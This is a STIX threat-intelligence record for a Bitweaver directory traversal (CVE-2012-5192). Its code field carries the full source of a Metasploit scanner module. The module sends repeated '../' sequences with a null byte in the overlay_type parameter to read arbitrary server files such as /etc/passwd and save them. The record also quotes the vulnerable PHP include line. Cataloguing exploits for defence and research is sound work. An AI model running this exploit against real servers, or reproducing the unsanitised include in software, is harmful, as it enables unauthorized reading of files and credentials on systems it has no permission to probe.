{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--435d7c61-a7d8-4b37-b585-6409523e456b",
    "created": "2024-08-14T16:28:43.350771Z",
    "modified": "2024-08-14T16:28:43.350775Z",
    "name": "Bitweaver overlay_type Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability found in Bitweaver. When handling the 'overlay_type' parameter, view_overlay.php fails to do any path checking/filtering, which can be abused to read any file outside the virtual directory.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/bitweaver_overlay_type_traversal.rb",
            "external_id": "bitweaver_overlay_type_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/spiderlabs/advisories/TWSL2012-016.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Bitweaver overlay_type Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability found in Bitweaver.\n        When handling the 'overlay_type' parameter, view_overlay.php fails to do any\n        path checking/filtering, which can be abused to read any file outside the\n        virtual directory.\n      },\n      'References'     =>\n        [\n          ['CVE', '2012-5192'],\n          ['OSVDB', '86599'],\n          ['EDB', '22216'],\n          ['URL', 'https://www.trustwave.com/spiderlabs/advisories/TWSL2012-016.txt']\n        ],\n      'Author'         =>\n        [\n          'David Aaron',       # Trustwave SpiderLabs\n          'Jonathan Claudius', # Trustwave SpiderLabs\n          'sinn3r'             # Metasploit\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2012-10-23'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/bitweaver/']),\n        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),\n        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])\n      ])\n  end\n\n\n  def run_host(ip)\n    base = target_uri.path\n\n    peer = \"#{ip}:#{rport}\"\n    fname = datastore['FILE']\n    fname = fname[1, fname.length] if fname =~ /^\\//\n\n    print_status(\"Reading '#{datastore['FILE']}'\")\n    traverse = \"../\" * datastore['DEPTH']\n    res = send_request_cgi({\n      'method'        => 'GET',\n      'encode_params' => false,\n      'uri'           => normalize_uri(base, \"gmap/view_overlay.php\"),\n      'vars_get'      => {\n        'overlay_type' => \"#{traverse}#{fname}%00\"\n      }\n    })\n\n    if res and res.code == 200 and res.body =~ /failed to open stream\\: No such file/\n      print_error(\"Cannot read '#{fname}'. File does not exist.\")\n\n    elsif res and res.code == 200 and res.body =~ /failed to open stream\\: Permission denied/\n      print_error(\"Cannot read '#{fname}'. Permission denied.\")\n\n    elsif res and res.code == 200 and res.body =~ /Failed opening required/\n      print_error(\"Cannot read '#{fname}'. Possibly not vulnerable.\")\n\n    elsif res and res.code == 200\n      data = res.body\n      data = (data.scan(/(.+)\\n(<br \\/>)*\\n*.+Notice.+/m).flatten[0] || '').gsub(/\\n<br \\/>$/, '')\n\n      p = store_loot(\n        'bitweaver.overlay_type',\n        'application/octet-stream',\n        ip,\n        data,\n        fname\n      )\n\n      vprint_line(data)\n      print_good(\"#{datastore['FILE']} stored as '#{p}'\")\n\n    else\n      print_error(\"Request failed due to some unknown reason\")\n    end\n  end\nend\n\n=begin\nif( !empty( $_REQUEST['overlay_type'] ) ){\n        $type = $_REQUEST['overlay_type'];\n}\n\n// Now check permissions to access this page\n$gBitSystem->verifyPermission('p_gmap_overlay_view' );\n\n// Get the overlay for specified overylay_id\nrequire_once(GMAP_PKG_PATH.'lookup_'.$type.'_inc.php' );\n=end\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-10-23"
}